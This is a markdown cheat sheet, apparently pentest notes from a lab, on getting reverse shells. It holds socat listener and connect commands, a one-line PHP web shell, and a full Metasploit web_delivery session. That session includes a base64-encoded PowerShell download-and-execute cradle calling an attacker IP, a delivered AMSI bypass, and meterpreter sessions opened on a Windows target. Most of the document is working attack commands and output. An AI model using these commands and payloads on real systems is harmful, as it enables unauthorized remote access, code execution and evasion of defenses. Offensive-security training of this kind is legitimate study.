# Reverse Shell

## Socat

### Listener

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

### Connect

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<RHOST>:<RPORT>
```

## Web shell

### PHP

```php
<?php system($_GET['cmd']); ?>
```

## Metasploit - web_delivery

```bash
$ msfconsole -q                                
msf6 > use multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X

msf6 exploit(multi/script/web_delivery) > set target PSH
target => PSH
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => tun0
msf6 exploit(multi/script/web_delivery) > set srvhost tun0
srvhost => 10.10.14.2
msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.2       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0
                                       to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   2   PSH

View the full module info with the info, or info -d command.

msf6 exploit(multi/script/web_delivery) >
```

```bash
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.2:4444 
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.14.2:8080/2G2XUQaZ6hZ
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABuADUAMwBnAFQAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbgA1ADMAZwBUAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbgA1ADMAZwBUAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwAyAEcAMgBYAFUAUQBhAFoANgBoAFoALwBJADQATABnAE0AVwBMADUATgBzADIASwBnAGsAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAOgA4ADAAOAAwAC8AMgBHADIAWABVAFEAYQBaADYAaABaACcAKQApADsA
[*] Sending stage (201798 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.180:49739) at 2024-05-24 23:23:02 -0700
```

Execute the payload on the target.

```bash
[*] Sending stage (201798 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.180:49739) at 2024-05-24 23:23:02 -0700
[*] 10.10.10.180     web_delivery - Delivering AMSI Bypass (1391 bytes)
[*] 10.10.10.180     web_delivery - Delivering Payload (3723 bytes)
[*] Sending stage (201798 bytes) to 10.10.10.180
[*] Meterpreter session 2 opened (10.10.14.2:4444 -> 10.10.10.180:49758) at 2024-05-24 23:25:11 -0700
```

```bash
msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ REMOTE  10.10.14.2:4444 -> 10.10.10.180:49739 (10.10.10.180)
  2         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ REMOTE  10.10.14.2:4444 -> 10.10.10.180:49758 (10.10.10.180)
```

```bash
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
meterpreter > sysinfo
Computer        : REMOTE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > 
```

## Links

- [RevShells Online](https://www.revshells.com/)
- [Reverse Shell - Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [HTB Academy - MSFVenom & meterpreter revshell](https://academy.hackthebox.com/module/39/section/418)
